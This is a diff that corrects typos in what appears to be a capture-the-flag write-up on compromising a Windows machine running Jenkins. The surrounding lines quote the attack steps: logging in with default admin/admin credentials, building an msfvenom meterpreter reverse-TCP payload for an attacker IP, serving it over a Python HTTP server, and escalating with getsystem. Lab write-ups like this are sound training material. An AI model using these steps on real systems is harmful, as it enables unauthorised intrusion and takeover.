@@ -89,13 +89,13 @@ Since we found a few web servers, I'll fire `nikto` and `dirbuster` on them in o
 
 Our various scans and manually browsing confirmed that we are up against a `Windows machine` running `Jenkins`.
 
-While our extra scans our running, we can search if any known vulnerability applies to the services we found. For this, I recommand using `searchsploit` if you want to stay in the CLI, or search engines for a more graphial approach.
+While our extra scans our running, we can search if any known vulnerability applies to the services we found. For this, I recommend using `searchsploit` if you want to stay in the CLI, or search engines for a more graphical approach.
 
 Unfortunately, we don't find anything relevant nor obvious. Let's see how we can attack this box.
 
 ## Exploitation
 
-Since we haven't found anything huge, we'll try to login to the admin panel using default and / or well known credentials. This is a brutefore attack!
+Since we haven't found anything huge, we'll try to login to the admin panel using default and / or well known credentials. This is a brute force attack!
 
 It happens, that we are lucky, some lazy admin used `admin` // `admin` as credentials! It was my first try, I didn't even had to fire `Burp Intruder`, great!
 
@@ -145,13 +145,13 @@ Ok, now that we have confirmed that we can run commands as Bruce on the system, 
 
 However, one easy solution would be to get a meterpreter shell and use msfconsole...
 
-Before going any further, I will run another build doing a `dir "C:\"`. I just want to check the system architecture (be sure check my [cheatsheets](https://www.masoopy.com/cheatsheets/) if you are lost during a phase). It might prove usefull later on, if I want to craft something with `msfvenom`.
+Before going any further, I will run another build doing a `dir "C:\"`. I just want to check the system architecture (be sure check my [cheatsheets](https://www.masoopy.com/cheatsheets/) if you are lost during a phase). It might prove useful later on, if I want to craft something with `msfvenom`.
 
 Since we know our arch is 64 bits, let's craft our shell :
 
 `msfvenom -p windows/meterpreter/reverse_tcp LHOST=$attacker_ip LPORT=10443 -f exe > shell.exe`
 
-Now we run a basic HTTP server from our attaking machine to host the shell :
+Now we run a basic HTTP server from our attacking machine to host the shell :
 
 `sudo python2 -m SimpleHTTPServer 80`
 
@@ -170,7 +170,7 @@ Thanks to power of metasploit, a simple `getsystem` will give us root:
 
 ![Jenkins root](/images/2021/02/jenkins_user_root.png)
 
-NB : this is where MetaSploit is clearly TOO powerfull! I gained root, using only one command... I have no idea what went on behind the scenes! I clearly need to look for a manual way to do that. But this will be for another time.
+NB : this is where MetaSploit is clearly TOO powerful! I gained root, using only one command... I have no idea what went on behind the scenes! I clearly need to look for a manual way to do that. But this will be for another time.
 
 
 Since we are "root", let's search for the flag :
